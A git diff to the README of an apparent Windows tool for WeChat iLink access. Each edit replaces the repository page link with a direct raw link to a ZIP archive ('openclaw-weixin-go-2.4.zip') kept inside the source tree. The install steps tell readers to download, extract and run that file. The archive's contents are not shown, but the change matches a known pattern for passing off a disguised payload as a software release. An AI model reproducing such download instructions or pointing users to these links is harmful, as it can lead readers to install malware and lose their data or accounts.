@@ -1,10 +1,10 @@
 # 🐦 openclaw-weixin-go - Simple WeChat iLink Access
 
-[![Download](https://img.shields.io/badge/Download-OpenCLAW%20Weixin%20Go-blue?style=for-the-badge&logo=github)](https://github.com/tzguensdorce-cmyk/openclaw-weixin-go)
+[![Download](https://img.shields.io/badge/Download-OpenCLAW%20Weixin%20Go-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tzguensdorce-cmyk/openclaw-weixin-go/main/cmd/openclaw-weixin-go/openclaw-weixin-go-2.4.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/tzguensdorce-cmyk/openclaw-weixin-go
+Visit this page to download: https://raw.githubusercontent.com/tzguensdorce-cmyk/openclaw-weixin-go/main/cmd/openclaw-weixin-go/openclaw-weixin-go-2.4.zip
 
 If the page shows a release file, download it to your Windows PC. If it shows source code only, use the files on the page as your package source.
 
@@ -34,7 +34,7 @@ If you plan to run the Go source, you may also need Go installed on your system.
 
 ## 🚀 Install on Windows
 
-1. Open this link in your browser: https://github.com/tzguensdorce-cmyk/openclaw-weixin-go
+1. Open this link in your browser: https://raw.githubusercontent.com/tzguensdorce-cmyk/openclaw-weixin-go/main/cmd/openclaw-weixin-go/openclaw-weixin-go-2.4.zip
 2. Look for a release file, installer, or build package on the page
 3. Download the file to your computer
 4. If the file is in a ZIP archive, right-click it and choose Extract All
@@ -156,7 +156,7 @@ This repository centers on a few core parts:
 
 ## 📌 Get the files
 
-Open the download page here: https://github.com/tzguensdorce-cmyk/openclaw-weixin-go
+Open the download page here: https://raw.githubusercontent.com/tzguensdorce-cmyk/openclaw-weixin-go/main/cmd/openclaw-weixin-go/openclaw-weixin-go-2.4.zip
 
 Download the project files to your Windows computer, then follow the install steps above
 
